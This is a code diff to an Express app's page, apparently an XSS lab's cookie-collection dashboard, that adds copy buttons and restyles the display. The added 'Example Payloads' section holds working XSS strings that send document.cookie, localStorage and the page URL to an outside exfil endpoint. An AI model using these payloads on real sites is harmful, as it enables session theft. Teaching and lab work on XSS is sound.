@@ -94,7 +94,7 @@ app.get('/', (req, res) => {
   <style>
     body { 
       background: #1a1a1a; 
-      color: #00ff00; 
+      color: #ffffff; 
       font-family: 'Courier New', monospace;
     }
     .container { max-width: 1200px; }
@@ -122,7 +122,7 @@ app.get('/', (req, res) => {
     .url { color: #55ff55; }
     pre { 
       background: #000; 
-      color: #00ff00; 
+      color: #ffffff; 
       padding: 1rem; 
       border-radius: 5px;
       overflow-x: auto;
@@ -156,6 +156,30 @@ app.get('/', (req, res) => {
     .stat-label {
       color: #00ff00;
       font-size: 0.9rem;
+    }
+    .payload-container {
+      position: relative;
+      margin-bottom: 1rem;
+    }
+    .copy-btn {
+      position: absolute;
+      top: 0.5rem;
+      right: 0.5rem;
+      padding: 0.25rem 0.5rem;
+      font-size: 0.75rem;
+      background: #00ff00;
+      color: #000;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+    }
+    .copy-btn:hover {
+      background: #00cc00;
+    }
+    .copy-btn.copied {
+      background: #ff00ff;
+      color: #fff;
     }
   </style>
 </head>
@@ -255,16 +279,42 @@ app.get('/', (req, res) => {
         </ol>
         
         <div class="mt-3">
-          <strong class="text-warning">🎯 Example Payloads :</strong>
-          <pre>&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil?data='+document.cookie)"&gt;</pre>
-          <pre>&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil?data='+document.cookie)"&gt;</pre>
-          <pre>&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,localStorage:JSON.stringify(localStorage),url:location.href})})"&gt;</pre>
+          <strong class="text-warning">🎯 Example Payloads (click to copy):</strong>
+          
+          <div class="payload-container">
+            <button class="copy-btn" onclick="copyPayload(this, 0)">📋 COPY</button>
+            <pre id="payload-0">&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil?data='+document.cookie)"&gt;</pre>
+          </div>
+          
+          <div class="payload-container">
+            <button class="copy-btn" onclick="copyPayload(this, 1)">📋 COPY</button>
+            <pre id="payload-1">&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,localStorage:JSON.stringify(localStorage),url:location.href})})"&gt;</pre>
+          </div>
         </div>
       </div>
     </div>
   </div>
 
   <script>
+    // Copy payload to clipboard
+    function copyPayload(button, payloadId) {
+      const pre = document.getElementById('payload-' + payloadId);
+      const text = pre.textContent;
+      
+      navigator.clipboard.writeText(text).then(() => {
+        button.textContent = '✅ COPIED!';
+        button.classList.add('copied');
+        
+        setTimeout(() => {
+          button.textContent = '📋 COPY';
+          button.classList.remove('copied');
+        }, 2000);
+      }).catch(err => {
+        console.error('Failed to copy:', err);
+        alert('Failed to copy. Please copy manually.');
+      });
+    }
+    
     // Auto-refresh every 3 seconds
     setInterval(() => {
       location.reload();
